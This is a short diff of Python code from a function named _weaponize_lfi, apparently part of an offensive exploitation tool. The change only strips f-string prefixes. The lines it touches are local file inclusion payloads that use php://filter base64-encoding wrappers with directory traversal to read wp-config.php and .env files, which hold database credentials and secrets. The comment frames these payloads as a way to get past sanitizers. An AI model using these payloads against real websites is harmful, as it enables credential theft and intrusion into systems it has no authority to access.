@@ -335,12 +335,12 @@ def _weaponize_lfi(boot, res, step_fn) -> dict:
     # Traversal may be blocked by sanitizers that strip ../ but allow PHP wrappers.
     _step(step_fn, "trying PHP wrappers for LFI escalation (php://filter, php://input)")
     _php_wrapper_targets = [
-        (f"php://filter/convert.base64-encode/resource=wp-config.php", "wp-config.php"),
-        (f"php://filter/convert.base64-encode/resource=../../wp-config.php", "wp-config.php"),
-        (f"php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php", "wp-config.php"),
-        (f"php://filter/read=convert.base64-encode/resource=wp-config.php", "wp-config.php"),
-        (f"php://filter/convert.base64-encode/resource=.env", ".env"),
-        (f"php://filter/convert.base64-encode/resource=../../.env", ".env"),
+        ("php://filter/convert.base64-encode/resource=wp-config.php", "wp-config.php"),
+        ("php://filter/convert.base64-encode/resource=../../wp-config.php", "wp-config.php"),
+        ("php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php", "wp-config.php"),
+        ("php://filter/read=convert.base64-encode/resource=wp-config.php", "wp-config.php"),
+        ("php://filter/convert.base64-encode/resource=.env", ".env"),
+        ("php://filter/convert.base64-encode/resource=../../.env", ".env"),
     ]
     import base64 as _b64
     for _wrapper_payload, _target_name in _php_wrapper_targets:
